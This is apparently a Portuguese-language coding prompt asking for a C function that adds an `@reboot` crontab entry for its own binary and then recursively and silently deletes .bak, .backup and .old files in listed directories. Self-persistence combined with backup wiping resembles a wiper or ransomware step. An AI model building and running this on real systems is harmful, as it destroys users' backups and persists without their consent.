Implemente a função `register_service` em C com a seguinte especificação funcional:

A função deve aceitar como parâmetros:
- `int argc` e `char *argv[]` (padrão da main) – para obter o caminho do binário a partir de `argv[0]`.
- `const char *scan_storage` – caminho para um arquivo contendo uma lista de diretórios a serem monitorados (um por linha).

Comportamento esperado:

1. **Gerenciamento do crontab do usuário atual:**
   - Abra um pipe de leitura executando `popen("crontab -l", "r")`.
   - Leia linha a linha da saída do crontab.
   - Verifique se existe uma linha exata no formato `@reboot <binary_path>` (onde `<binary_path>` é o caminho absoluto ou relativo presente em `argv[0]`, normalizado para absoluto se necessário).
   - Caso a entrada NÃO exista, abra um pipe de escrita com `popen("crontab -", "w")` e escreva todo o conteúdo lido anteriormente, mais a nova linha `@reboot <binary_path>\n` no final. Feche ambos os pipes apropriadamente.
   - Se a entrada já existir, apenas feche o pipe de leitura e prossiga.

2. **Limpeza de arquivos de backup antigos:**
   - Leia o arquivo apontado por `scan_storage` (formato: um diretório por linha, ignorando linhas vazias/comentários).
   - Para cada diretório listado, percorra recursivamente todos os arquivos dentro dele (não é necessário seguir links simbólicos).
   - Se o nome do arquivo terminar com uma das extensões: `.bak`, `.backup` ou `.old`, remova-o usando a função `remove()`.
   - Trate silenciosamente erros de remoção (arquivo não encontrado, permissão negada) – apenas prossiga.

3. **Considerações de implementação:**
   - A função deve ser thread-safe? Não, assuma execução single-thread.
   - A memória para o buffer do crontab deve ser alocada dinamicamente; limite máximo razoável (ex.: 1000 linhas, 4096 bytes por linha).
   - Use `realpath()` para normalizar `argv[0]` antes da comparação.
   - Cuidado com pipes: feche ambos os lados para evitar deadlocks.
   - A função retorna 0 em sucesso completo, -1 em erro (com `errno` apropriado definido).

Assinatura da função:
```c
int register_service(int argc, char *argv[], const char *scan_storage);
```
